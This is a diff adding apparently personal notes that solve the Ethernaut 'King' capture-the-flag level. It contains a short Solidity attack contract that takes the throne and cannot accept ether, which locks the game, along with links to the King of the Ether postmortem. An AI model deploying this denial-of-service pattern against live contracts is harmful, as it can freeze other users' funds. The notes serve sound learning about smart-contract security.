@@ -1,0 +1,38 @@
+220311 18:55 KST
+
+I think I just need to make sure that 
+the new king(actually my smart contract)
+cannot receive ether.
+
+I will deploy a contract on remix.
+
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.0;
+
+contract RealKing {
+    address target = 0x42fD79Eb8001d84f6A1372d61184926Ada86BdB4;
+    function sendETH() external payable {
+        (bool success, ) = target.call{value: msg.value }("");
+       // require(success, "ether not sent");
+    }
+}
+
+
+
+    ah.. shit. I should specify function selector. my bad.
+
+    ah...? it was receive function. I should be able to just send eth with out message.
+
+    220311 19:36 KST
+    damn, I just had to send more
+
+
+Most of Ethernaut's levels try to expose (in an oversimpliefied form of course) something that actually happend. A real hack or a real bug.
+
+In this case, see: King of the Ether and King of the Ether Postmortem
+
+
+https://www.kingoftheether.com/thrones/kingoftheether/index.html
+
+http://www.kingoftheether.com/postmortem.html
+
